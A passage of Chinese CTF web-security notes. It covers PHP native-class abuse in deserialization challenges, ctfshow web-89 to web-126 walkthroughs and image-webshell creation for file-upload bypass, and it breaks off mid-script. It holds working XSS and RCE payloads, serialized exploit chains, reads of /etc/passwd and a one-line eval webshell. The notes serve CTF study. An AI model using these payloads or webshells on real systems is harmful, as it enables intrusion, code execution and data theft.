- line：抛出错误在该文件中的行数

类属性的作用是告诉我们浏览器回显的数据代表的什么意思

```test
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;

浏览器回显:
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

payload代表message错误信息内容,/usercode/file.php代表file错误文件名,2代表错误行号可以看见这里没有输出code错误代码，如果想输出错误code只能自定义一个类重写_toString()方法输出错误代码

为什么不直接重写Error类呢？
因为Error是php的原生类,不能被覆写

自定义_toString()方法:
<?php
class CustomError extends Error {
    // 重写 __toString() 方法来输出错误代码
    public function __toString() {
        // 获取错误消息和错误代码
        return "Error Code: {$this->getCode()} - {$this->getMessage()} in {$this->getFile()} on line {$this->getLine()}";
    }
}

$a = new CustomError("payload",1);$b = new CustomError("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;

浏览器回显:
Error Code: 1 - payload in /usercode/file.php:10

Error Code: 2 - payload in /usercode/file.php:10
```

`Error` 类有一个 `__toString()` 方法，这个方法用来将 `Error` 对象转换为字符串。当你调用一个 `Error` 对象时，PHP会自动调用 `__toString()` 方法，将该对象的错误信息作为字符串输出。

这个方法可以被我们利用来进行XSS攻击，该方法会将传入给`__toString`的参数原封不动的输出到浏览器，所以当我们构造一个XSS攻击脚本的话，他就被执行，Exception也是一样的

```Poc
假设题目代码：
<?php
$a = unserialize($_GET['b']);
echo $a;

Poc：
<?php
$a = new Error("<script>alert('1')</script>");
echo urlencode(serialize($a));

Poc：
<?php
$a = new Exception("<script>alert('1')</script>");
echo urlencode(serialize($a));
得到payload,将payload注入，成功弹窗
```

特殊的时候还可以进行RCE

当eval()函数传入一个类对象时，也会触发这个类里的 `__toString` 方法

```Poc
假设题目代码：
<?php
$a = $_GET['a'];
$b = $_GET['b'];
eval("echo new $a($b());");
?>

Poc:
?a=Error&b=phpinfo

?a=Error&b=system(‘ipconfig’)
```

这个两个原生类还可以绕过哈希

[2020 极客大挑战]Greatphp：

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}
?>
```

讲解一下绕过思路：

利用md5()和sha1()可以对一个类进行hash，并且会触发这个类的 `__toString` 方法成功绕过；这里要把前面注释掉才能成功执行eval命令，因为Error前面还会输出报错信息`eval("...Error: <?php payload ?>")`

```Poc
<?php

class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>
```

##### SoapClient



##### DirectoryIterator/FilesystemIterator/GlobIterator

DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。Filesystemlerator也是一样的，Globlterator可以不用加glob协议，因为他自带

```test
<?php
$dir = $_GET['whoami'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>

# payload一句话的形式:
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}

<?php
$dir = $_GET['whoami'];
$a = new FilesystemIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>

# payload一句话的形式:
$a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}

<?php
$dir = $_GET['whoami'];
$a = new Globlterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>

# payload一句话的形式:
$a = new Globlterator("/*");foreach($a as $f){echo($f->__toString().'<br>');}
```

但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

##### ZipArchive

+ 条件：php>5.20

```text
ZipArchive::addEmptyDir：添加一个新的文件目录
ZipArchive::addFile：将文件添加到指定zip压缩包中
ZipArchive::addFromString：添加新的文件同时将内容添加进去
ZipArchive::close：关闭ziparchive
ZipArchive::extractTo：将压缩包解压
ZipArchive::open：打开一个zip压缩包
ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件
ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除
```

`ZipArchive::open`方法

```text
ZipArchive::open(string $filename, int $flags=0)
该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。

filename：要打开的ZIP存档的文件名。
flags：用于打开档案的模式。有以下几种模式：
ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。
ZipArchive::CREATE：如果不存在则创建一个zip压缩包。
ZipArchive::RDONLY：只读模式打开压缩包。
ZipArchive::EXCL：如果压缩包已经存在，则出错。
ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。

注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8

```

[NepCTF 2021]梦里花开牡丹亭

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include('shell.php');
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;
 
    public  $file;
    public  $filename;
    public  $content;
 
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }
 
    public function __wakeup(){
        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
            $this->choice=new login($this->file,$this->filename,$this->content);
        }else{
            $this->choice = new register();
        }
    }
    public function __destruct() {
        $this->choice->checking($this->username,$this->password);
    }
 
}
class login{
    public $file;
    public $filename;
    public $content;
 
    public function __construct($file,$filename,$content)
    {
        $this->file=$file;
        $this->filename=$filename;
        $this->content=$content;
    }
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            $this->file->open($this->filename,$this->content);
            die('login success you can to open shell file!');
        }
    }
}
class register{
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            die('success register admin');
        }else{
            die('please register admin ');
        }
    }
}
class Open{
    function open($filename, $content){
        if(!file_get_contents('waf.txt')){    // 当waf.txt没读取成功时才能得到flag
            shell($content);
        }else{
            echo file_get_contents($filename.".php");    // filename=php://filter/read=convert.base64-encode/resource=shell
        }
    }
}
if($_GET['a']!==$_GET['b']&&(md5($_GET['a']) === md5($_GET['b'])) && (sha1($_GET['a'])=== sha1($_GET['b']))){
    @unserialize(base64_decode($_POST['unser']));
}

```

直接读取shell.php内容

```Poc
$a=new Game();
$a->register='admin';
$a->filename='php://filter/read=convert.base64-encode/resource=shell';
$a->password='admin';
$a->username='admin';
$a->content="wusuowei";
$a->file=new Open();
echo base64_encode(serialize($a));
```

shell.php

```shell.php
<?php
function shell($cmd){
    if(strlen($cmd)<10){
        if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/',$cmd)){
            die("NO");
        }else{
            return system($cmd);
        }
    }else{
        die('so long!');
    }
}

```

利用ZipArchive的open函数删除文件

```Poc
<?php
error_reporting(-1);
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;

}
class login{
    public $file;
    public $filename;
    public $content;
}

class Open{
}

$poc = new Game();
$poc->username = "admin";
$poc->password = "admin";
$poc->register = "admin";
$poc->file = new ZipArchive();
$poc->filename = "waf.txt";
$poc->content = 8;
echo base64_encode(serialize($poc));
?>

```

执行命令

```Poc
$poc = new Game();
$poc->username = "admin";
$poc->password = "admin";
$poc->register = "admin";
$poc->file = new Open();
$poc->filename = "xxx";
$poc->content = "n\l /flag";	#命令执行绕过
echo base64_encode(serialize($poc));
?>

```

这道题其实有很大的巧合性，因为ZipArchive这个类正好有open函数，这道题也可以给open函数传参，但是这个ZipArchive有很大的利用前景

##### SplFileObject

读取文件的一行

```php
<?php
$context = new SplFileObject('/etc/passwd');
echo $context;

```

对文件中的每一行内容进行遍历

```php
<?php
$context = new SplFileObject('/etc/passwd');
foreach($context as $f){
    echo($f);
}

# payload一句话的形式:
<?php $context=new SplFileObject('/etc/passwd');foreach($context as $f){echo($f);}
```

但是这个还是绕不过`open_basedir`

##### SimpleXMLElement



##### ReflectionMethod

反射一个类中的方法，查看方法的信息，并可以调用该方法。

 主要功能：

- **获取方法名称**：`getName()`
- **获取方法的参数**：`getParameters()`
- **获取方法的返回类型**：`getReturnType()`
- **获取文档注释**：`getDocComment()`
- **查看方法的可见性**：`isPublic()`, `isPrivate()`, `isProtected()`
- **调用方法**：`invoke()`, `invokeArgs()`

| 特性         | `invoke()`                           | `invokeArgs()`                    |
| ------------ | ------------------------------------ | --------------------------------- |
| **传参方式** | 直接传入多个参数                     | 通过数组传入参数                  |
| **语法**     | `invoke($object, $arg1, $arg2, ...)` | `invokeArgs($object, $argsArray)` |
| **适用场景** | 参数数量已知，直接传递               | 参数数量不确定或参数来自动态数组  |

```php
class MyClass {
    public function myMethod($param1, $param2) {
        return $param1 + $param2;
    }
}

$reflectionMethod = new ReflectionMethod('MyClass', 'myMethod');
echo $reflectionMethod->getName(); // 输出: myMethod

// 获取方法的参数
$params = $reflectionMethod->getParameters();
foreach ($params as $param) {
    echo $param->getName() . "\n"; // 输出: param1, param2
}

// 调用方法
$obj = new MyClass();
echo $reflectionMethod->invoke($obj, 5, 3); // 输出: 8
```

##### ReflectionClass

反射一个类，查看类的属性、方法、常量、继承关系等信息，并可以实例化该类。

 主要功能：

- **获取类名称**：`getName()`
- **获取类的所有方法**：`getMethods()`
- **获取类的所有属性**：`getProperties()`
- **获取类的父类**：`getParentClass()`
- **获取文档注释**：`getDocComment()`
- **创建类实例**：`newInstance()`
- **获取类的构造函数**：`getConstructor()`
- **查看类是否实现某个接口或继承某个类**：`implementsInterface()`, `isSubclassOf()`

```php
class MyClass {
    public $prop1;
    private $prop2;
    
    public function myMethod() {}
}

$reflectionClass = new ReflectionClass('MyClass');

// 获取类名
echo $reflectionClass->getName(); // 输出: MyClass

// 获取类的所有属性
$properties = $reflectionClass->getProperties();
foreach ($properties as $property) {
    echo $property->getName() . "\n"; // 输出: prop1, prop2
}

// 获取类的所有方法
$methods = $reflectionClass->getMethods();
foreach ($methods as $method) {
    echo $method->getName() . "\n"; // 输出: myMethod
}

// 创建类的实例
$instance = $reflectionClass->newInstance();

```

反射类不仅仅可以建立对类的映射，也可以**建立对PHP基本方法的映射**，并且返回基本方法执行的情况。因此可以通过建立反射类`new ReflectionClass(system('cmd'))`来执行命令

直接echo这个反射类`echo new ReflectionClass(SYCLOVER);`可以得到这个类的全部信息

##### ReflectionFunction

反射一个全局函数，查看函数的信息，并可以调用该函数。

 主要功能：

- **获取函数名称**：`getName()`
- **获取函数的参数**：`getParameters()`
- **获取函数的返回类型**：`getReturnType()`
- **获取文档注释**：`getDocComment()`
- **查看函数的参数是否是传值或传引用**：`isPassedByReference()`
- **调用函数**：`invoke()`, `invokeArgs()`

```php
function myFunction($param1, $param2) {
    return $param1 + $param2;
}

$reflectionFunction = new ReflectionFunction('myFunction');

// 获取函数名称
echo $reflectionFunction->getName(); // 输出: myFunction

// 获取函数的参数
$params = $reflectionFunction->getParameters();
foreach ($params as $param) {
    echo $param->getName() . "\n"; // 输出: param1, param2
}

// 调用函数
echo $reflectionFunction->invoke(5, 3); // 输出: 8

```

可以用这个反射函数类执行系统函数也就是`system()`从而达到RCE

```Poc
<?php
$function = new ReflectionFunction('system');
echo $function->invoke("whoami");
?>
 
 
//如果system被过滤
<?php
$function = new ReflectionFunction('call_user_func');
echo $function->invokeArgs(array('s'.'y'.'s'.'tem','whoami'));
//array(%27s%27.%27y%27.%27s%27.%27tem%27,%27cat%20/f%27.%27lag%27)
?>

# payload一句话的形式:
<?php $function = new ReflectionFunction('call_user_func');echo $function->invokeArgs(array('s'.'y'.'s'.'tem','whoami'));?>
```

- **`call_user_func`** 是一个全局函数，可以用来调用一个函数或方法，接受回调作为参数，可以调用全局函数、静态方法、实例方法等。

### web-89

```text
数组绕过intval，空数组intval返回0，有参数组返回1
url数组传参是：?num[]=s
解析为num这个数组有s这个元素，不是?num=array('s')这样传入的只是一个字符串
```

### web-90

```php
intval自定义进制强比较绕过

if($num==="4476"){
        die("no no no!");
    }
if(intval($num,0)===4476)

可以通过intval函数自定义进制,取反,算数运算符
4476=0x117c,4476=010574,4476=+4476,
4476=~~4476(这个绕过不一定成功，因为，GET请求读取参数会把参数转变成字符串),
4476=4476e0,4476=4476abc,
4476=2238*2(这个绕过不一定成功，因为，GET请求读取参数会把参数转变成字符串,所以只读取了2238)
```

### web-91

```text
因为这先使用了/m操作对每一行进行正则匹配，所以
payload:
1%0aphp
```

### web-92/93/94/95

```text
同90
可以用url编码在中间加个空格
```

### web-96

```text
可以使用php伪协议进行绕过，
这里进行了测试，正常读取传参的值是一个字符串。
只有特定的函数(大部分与文件操作相关的)，才会取解析php伪协议流，例如这题highlight_file
```

### web-97

数组绕过md5强比较，数组进行`md5()`会返回NULL

### web-98

这题考的是代码审计，和三目运算符`a?b:c`若a成立则执行b，反之执行c,还考了一个GET和POST请求之间赋值的一个操作`$_GET=&$_POST`将POST赋值给GET

### web-99

##### in_array函数的特性

题目代码中存在的知识点：

```php
array_push——往数组尾部插入元素
rand(1,$i)——随机生成1-877之间的数
//所以array_push($allow, rand(1,$i))就是往数组尾部插入1-877之间的数字
in_array——搜索数组中是否存在指定的值:
in_array(search,array,type)
search为指定搜索的值
array为指定检索的数组
type为TRUE则 函数还会检查 search的类型是否和 array中的相同
    
综上，我们可以发现数组中的值是int，而在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的,满足条件，同时进入下一步后，我们就可将一句话木马写入了5.php中，然后蚁剑连接即可查看到flag
```

### web-100

题目代码中存在的知识点：

1. `=`的优先级要大于and，所以是先进行v1对v0的赋值操作，所以这题只需要v1为数字类型
2. 命令拼接，v2=system()/&v3/;把中间的ctfshow注释掉就行了
3. 观察自己得出来的flag和以往的有什么区别，(独立思考)

### web-101

已经提示了我们flag在ctfshow这个类里面，前面对我们的拼接进行了严格的过滤，所以我们采用反射类，echo出ctfshow类里面所有的内容

```payload
v1=1&v2=echo new ReflectionClass&v3=;
```

### web-102/103

这里要求v2是能绕过is_numeric检测的数字，因为环境大于php5，所以0x十六进制不能使用，只能使用纯数字或者有一个e,这里有一个完美的数字`5044383949474167494352665230565557324664594473`=**<?= \`  $_GET[a]\`;**

RCE:

```RCE
?a=ls
?a=cat flag.php
```

一句话木马：

```e.g.
?a=echo -n '<?php @eval($_POST[1]);?>'>2.php
```

其他的就简单了，v2前两位绕过，`call_user_func`是使用全局函数，v1=hex2bin将v2转成2进制字符串就可以了，然后利用`file_put_contents`的伪协议`php://filter/write=convert.base64-encode/resource=shell.php`,写入一个数据，然后访问`url/shell.php?a=echo -n '<?php @eval($_POST[1]);?>'>2.php`接着一句话木马连就可以了

payload：

```payload
GET:
v2=125044383949474167494352665230565557324664594473&v3=php://filter/write=convert.base64-decode/resource=shell.php

POST:
v1=hex2bin
```

### web-104/106

```text
没有说的，随便找两个sha值一样的就可以

碰撞值
GET
?v2=aaO8zKZF
0e89257456677279068558073954252716165668

POST
v1=aaK1STfY
0e76658526655756207688271159624026011393 
```

### web-105

这里我们首先要搞懂一个东西，传参的值是不会改变的

因为他最后要考察POST参数flag键名的值等不等于$flag的值

```php
foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
} 
//这里看似对POST传参数组的键值对进行了变量赋值，其实var_dump($_POST)发现传参的值还是没有改变，因为传参等于字符串
//我们只能利用已有的变量进行赋值操作，
```

这道题我们要绕过前面所有的`die()`首先一个GET参数键名不能为error，POST参数键值不能为flag

因为前面他给了变量赋值操作，意味着我们可以将$flag的值赋给已有变量error，利用最后的die()将error的值

```Poc
GET:
url/?a=flag

POST:
error=a
```

### web-107

##### `parse_str()`函数解释

```php
<?php
parse_str("name=Bill&age=60",$myArray);
print_r($myArray);
?>

Array ( [name] => Bill [age] => 60 )
```

+ 解法1：
	+ 我们只要满足v3的md5等于v2[flag]即可。可以传递给v3任意值，然后v1=flag=v3的md5值。

+ 解法2：
	+ 我们传入v3[]=1，则md5($v3)就是null 这时候v1随便传,也可以满足`if($v2['flag']==md5($v3))`

### web-108

这题考察ereg的%00截断，ereg函数遇到%00会不再进行匹配

`strrev`是将字符串反转

思路：开始写个字母+%00绕过正则，后面0x36d=877,这里弱比较所以877a=877

```payload
url/?c=a%00778
```

### web-109

来个原生类加上一个命令执行函数就行了，只要这个原生类有__tostring的方法，就会把后面变成字符串也就变成了`eval($v2();)`

这个正则就只保证你要有字母就行了

```payload
url/?v1=ReflectionFunction&v2=system('tac fl36dg.txt')
```

### web-110

这题主要说明一下DirectoryIterator和FilesystemIterator

`url/?v1=DirectoryIterator&v2=getcwd`会返回`..`也就是上一级目录

`url/?v1=FilesystemIterator&v2=getcwd`会返回第一个文件，也就是分类fl36dga.txt

url/fl36dga.txt即可得到flag

 **总结对比：FilesystemIterator>DirectoryIterator**

| 特性         | `DirectoryIterator`                       | `FilesystemIterator`                                   |
| ------------ | ----------------------------------------- | ------------------------------------------------------ |
| **继承关系** | 实现自 `Iterator`，用于遍历目录中的文件。 | 继承自 `DirectoryIterator`，增加了更多功能。           |
| **功能**     | 基本的目录遍历功能。                      | 附加功能：如跳过 `.` 和 `..` 文件，控制返回格式等。    |
| **选项**     | 无额外选项。                              | 提供多个选项如 `SKIP_DOTS`，`CURRENT_AS_FILEINFO` 等。 |
| **适用场景** | 简单的目录遍历任务。                      | 需要更复杂控制的文件遍历任务。                         |

### web-111

这题考察超全局变量，会返回全局作用域中所有可用变量

URL 传参时 \$v2 不能直接传为 flag，否则 $flag 会因“函数内部无法调用外部变量”的限制而导致其返回 null

```introduce
$GLOBALS ：
	 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
```

payload:

```payload
url/?v1=ctfshow&v2=GLOBALS
```

### web-112/114

这里`is_file()`和`highlight()`函数都支持一部分伪协议，所以采用伪协议绕过，发现filter可以

讲一下为什么有一些协议不行：

+ file协议不能绕过is_file的判断。
+ http协议需要公网ip。
+ glob协议返回的是一个[数组](https://edu.csdn.net/course/detail/40020?utm_source=glcblog&spm=1001.2101.3001.7020)。highlight_file不能对数组进行高亮，所以本题不能用。

尝试读取一下flag.php

```payload
url/?file=php://filter/resource=flag.php
```

### web-113

方法1：`compress.zlib://`协议读取出flag

```payload
url/?file=compress.zlib:///var/www/html/flag.php
```

方法2：目录溢出

```payload
url/?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

```

`is_file()` 目录溢出漏洞:

`/proc/self`：不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。`/proc/self/root/`是指向`/`的符号链接，就是根目录。

### web-115

利用换页符进行绕过

```payload
url/?num=%0c36
%0c==\f
```

`is_numeric`函数判定会数字字符串返回true，num!==36因为这里是强比较，然而%0c36他的类型是字符串所以这个返回true，trim没有过滤%0c返回true，filter没有过滤返回true

#### trim函数

trim函数移除传入字符串的以下数据

```text
"\0" - NULL
"\t" - 制表符
"\n" - 换行
"\x0B" - 垂直制表符
"\r" - 回车
" " - 空格
```

在实战中，网上可能没有我们所需的过滤，所以我们可以采用脚本来爆破

```php
<?php
$num=0;
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
} 
for($num=0;$num<127;$num++)
{
    $char = chr($num).'36';  // 将数字转为 ASCII 字符

    // 判断字符是否符合条件
    if (is_numeric($char) && $char !== '36' && trim($char) !== '36' && filter($char) == '36') {
        echo $num . " => " .urlencode($char) . "\n";	//这个字符可能打印不出来，所以进行url编码
    }
}
```

爆破成功，回显:

```payload
12 => %0C36 
```

### web-123

#### **常见的 `$_SERVER` 键值**

以下是一些常用的 `$_SERVER` 键值及其含义：

1. **脚本路径相关**

- **`PHP_SELF`**
	当前脚本的文件路径（相对于网站根目录）。
	例如：`/index.php`
- **`SCRIPT_NAME`**
	当前脚本的路径（与 `PHP_SELF` 类似，但不包含查询字符串）。
	例如：`/index.php`
- **`SCRIPT_FILENAME`**
	当前脚本的绝对文件路径。
	例如：`/var/www/html/index.php`
- **`DOCUMENT_ROOT`**
	当前脚本所在的文档根目录。
	例如：`/var/www/html`

2. **请求相关**

- **`REQUEST_METHOD`**
	当前请求的 HTTP 方法（如 `GET`、`POST`、`PUT` 等）。
	例如：`GET`
- **`QUERY_STRING`**
	URL 中的查询字符串（`?` 后面的部分）。
	例如：`name=test&age=20`
- **`REQUEST_URI`**
	当前请求的 URI（包括查询字符串）。
	例如：`/index.php?name=test&age=20`

3. **客户端信息**

- **`REMOTE_ADDR`**
	客户端的 IP 地址。
	例如：`192.168.1.1`
- **`HTTP_USER_AGENT`**
	客户端的用户代理字符串（通常是浏览器信息）。
	例如：`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36`
- **`HTTP_REFERER`**
	当前请求的来源页面 URL（如果有）。
	例如：`https://www.example.com/previous-page`

4. **服务器信息**

- **`SERVER_NAME`**
	当前服务器的主机名。
	例如：`www.example.com`
- **`SERVER_ADDR`**
	当前服务器的 IP 地址。
	例如：`192.168.1.100`
- **`SERVER_PORT`**
	当前服务器使用的端口号。
	例如：`80`
- **`SERVER_PROTOCOL`**
	当前请求的协议和版本。
	例如：`HTTP/1.1`

5. **其他**

- **`HTTP_HOST`**
	当前请求的主机头（Host header）。
	例如：`www.example.com`
- **`HTTPS`**
	如果请求是通过 HTTPS 发起的，值为 `on`；否则为空。
- **`REMOTE_PORT`**
	客户端的端口号。
	例如：`54321`

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?> 
```

要求存在 post 传入 CTF_SHOW 和 CTF_SHOW.COM，不能存在 get 传入 fl0g。

正则匹配过滤掉了一些符号，符合则会执行 eval 函数，其中 c 来自 post 传入的 fun。

在php中在给参数传值时，如果参数名中存在非法字符（除字母数字下划线以外都是非法字符），比空格和点，则参数名中的点和空格等非法字符都会被替换成下划线。并且，**在PHP8之前，如果参数中出现中括号 [ ，那么中括号会被转换成下划线 _ ，但是会出现转换错误，导致如果参数名后面还存在非法字符，则不会继续转换成下划线。**也就是说，我们可以刻意拼接中括号制造这种错误，来保留后面的非法字符不被替换，因为中括号导致只会替换一次。

```
CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag
```

`$_SERVER` 是 PHP 中用于获取服务器和执行环境信息的超全局变量

第二种打法：

在 PHP 中，$_SERVER['argv'] 用于获取脚本的命令行参数，通常，这是在命令行模式下运行 PHP 脚本时使用的，而不是在网页模式下使用。

在网页模式下（通过浏览器访问 PHP 脚本），\$\_SERVER['argv'] 通常不包含有用的信息，因为网页请求没有命令行参数。然而，**有时服务器配置会将查询字符串或其他信息填充到 $_SERVER['argv'] 中**。

```
get：?$fl0g=flag_give_me;
post：CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])
```

```text
这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET['fl0g']) 仍然会返回 false，即没有检测到 fl0g 参数。

post 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST['CTF_SHOW']) && isset($_POST['CTF_SHOW.COM']) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。

准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER["QUERY_STRING"] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。

当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER['argv'] 中。
在这种配置下，$_SERVER['argv'][0] 包含了整个查询字符串，即 '$fl0g=flag_give_me;'。

在 eval("$c;"); 中实际执行的是 eval('eval($a[0]);');，因为 $a[0] 是 '$fl0g=flag_give_me;'，这相当于执行了 eval('$fl0g=flag_give_me;');，这样就定义了变量 $fl0g 并赋值为 'flag_give_me'。

最后 判断 if($fl0g === "flag_give_me")，因为 $fl0g 被正确地设置为了 'flag_give_me'，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。
```

第三种打法：

```
get: ?a=1+fl0g=flag_give_me
post: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
```

通过加号 + 分割 argv 成多个部分，也是为了得到 **fl0g=flag_give_me** ，其中 `parse_str()` 函数用来把查询字符串解析到变量中。

### web-125

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
#
#
*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?> 
```

其实理解了$_SERVER的键值填充了就可以了，这里直接理解就是你可以GET自定义输入式子（伪协议，等式.....）

payload:

```
get：?$fl0g=flag_give_me;
post：CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])
```

```
GET:?1=php://filter/convert.base64-encode/resource=flag.php post:CTF_SHOW=1&CTF[SHOW.COM=1&fun=include$_GET[1]
```



### web-126

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
#
#
*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
} 
```



## 文件上传

### 制作图片马

**注意**：利用图片马的前提是有文件包含漏洞

**Windows:**

```shell
copy 图片文件名/b+一句话木马文件名/a 制作的图片马文件名
```

**Linux:**

把木马文件追加到图片文件后面：

```shell
cat test1.asp >> test2.jpg
```

把两个文件合并成第三个文件：

```shell
cat test1.asp test2.jpg >> test3.jpg
```

**但是这种方法制作成的图片马不能绕过二次渲染**

**二次渲染：**

+ 网站服务器会对上传的图片进行二次处理，对文件内容进行替换更新，根据原有图片生成一个新的图片，这样就会改变文件原有的一些内容，我们需要将一句话木马插入到数据不会被改变的位置，确保一句话木马不会受到二次渲染的影响。

**GIF图片的二次渲染**：

+ 先用上面方法制作的图片马上传到服务器上，将服务器上面我们的图片down下来，发现我们写入的木马被消掉了

+ 关于绕过gif的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了。
+ 我们只用把木马写入不变的位置就可以绕过二次渲染

#### PNG图片的二次渲染：

+ png的二次渲染的绕过并不能像gif那样简单。因为png图片格式进行crc校验

**用别人直接写好的脚本：**

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
